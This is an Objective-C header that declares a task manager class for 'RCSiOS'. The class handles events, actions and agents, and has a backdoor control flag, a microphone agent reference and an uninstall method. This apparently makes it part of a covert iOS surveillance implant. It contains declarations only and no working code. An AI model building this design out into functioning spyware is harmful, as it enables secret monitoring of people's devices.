/*
 * RCSiOS - Task Manager
 *  This class will be responsible for managing all the operations within
 *  Events/Actions/Agents, thus the Core will have to deal with them in the
 *  most generic way.
 * 
 *
 * Created on 10/04/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#ifndef __RCSITaskManager_h__
#define __RCSITaskManager_h__

//#import "RCSIMicrophoneRecorder.h"

@class RCSIAgentMicrophone;
@class RCSIConfManager;
@class RCSIEventManager;
@class RCSIActionManager;
@class RCSISharedMemory;
@class RCSILogManager;

// This class is a singleton
@interface RCSITaskManager : NSObject
{
@private
  NSMutableArray *mEventsList;
  NSMutableArray *mActionsList;
  NSMutableArray *mAgentsList;
  NSMutableArray *mGlobalConfiguration;

@private
  NSString *mBackdoorControlFlag;
  BOOL mShouldReloadConfiguration;
  
@private
  RCSIConfManager   *mConfigManager;
  RCSIActionManager       *mActions;
  RCSISharedMemory  *mSharedMemory;
}

@property (readwrite, retain) NSMutableArray *mEventsList;
@property (readwrite, retain) NSMutableArray *mActionsList;
@property (readwrite, retain) NSMutableArray *mAgentsList;
@property (readonly, retain) NSMutableArray *mGlobalConfiguration;
@property (readwrite, copy)  NSString *mBackdoorControlFlag;
@property (readwrite)        BOOL mShouldReloadConfiguration;

+ (RCSITaskManager *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)init;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;

//- (BOOL)loadInitialConfiguration;
//- (BOOL)updateConfiguration: (NSMutableData *)aConfigurationData;
//- (BOOL)reloadConfiguration;
- (void)uninstallMeh;

- (BOOL)startAgent: (u_int)agentID;
- (BOOL)stopAgent: (u_int)agentID;

- (BOOL)suspendAgents;
- (BOOL)restartAgents;

- (BOOL)startAgents;
- (BOOL)stopAgents;

- (BOOL)startEventsMonitors;
- (BOOL)stopEvents;

- (BOOL)triggerAction: (int)anActionID;

- (BOOL)registerEvent: (NSData *)eventData
                 type: (u_int)aType
               action: (u_int)actionID;
- (BOOL)unregisterEvent: (u_int)eventID;

- (BOOL)registerAction: (NSData *)actionData
                  type: (u_int)actionType
                action: (u_int)actionID;
- (BOOL)unregisterAction: (u_int)actionID;

- (BOOL)registerAgent: (NSData *)agentData
              agentID: (u_int)agentID
               status: (u_int)status;
- (BOOL)unregisterAgent: (u_int)agentID;

- (BOOL)registerParameter: (NSData *)confData;
- (BOOL)unregisterParameter: (NSData *)confData;

- (NSArray *)getConfigForAction: (u_int)anActionID withFlag:(BOOL*)concurrent;
- (NSMutableDictionary *)getConfigForAgent: (u_int)anAgentID;

- (NSMutableArray*)getCopyOfEvents;
- (void)removeAllElements;

@end

#endif
